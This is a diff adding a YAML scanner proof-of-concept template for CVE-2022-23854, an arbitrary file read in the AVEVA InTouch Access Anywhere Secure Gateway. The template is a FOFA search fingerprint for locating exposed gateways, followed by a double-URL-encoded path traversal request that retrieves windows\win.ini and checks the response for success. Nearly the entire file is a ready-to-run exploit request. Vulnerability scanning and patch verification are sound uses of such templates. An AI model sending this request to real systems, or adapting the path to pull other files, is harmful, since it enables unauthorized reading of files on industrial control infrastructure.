@@ -1,0 +1,27 @@
+id: poc-yaml-aveva-intouch-security-gateway-accessanywhere-anyfileread
+info:
+  name: AVEVA InTouch安全网关 AccessAnywhere 任意文件读取漏洞(CVE-2022-23854)
+  severity: high
+  tags:
+  - CVE-2022-23854
+  - 任意文件或目录访问
+  finger: AVEVA InTouch安全网关
+  fofa: body="InTouch Access Anywhere"
+requests:
+- method: GET
+  path: /AccessAnywhere/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini
+  expression: 'status_code == 200
+
+    && contains(body,"[fonts]")
+
+    && contains(body,"[files]")
+
+    && contains(headers,"EricomSecureGateway")
+
+    && !contains(body,"<")
+
+    && content_type == "application/octet-stream"
+
+    '
+variables: {}
+transport: http
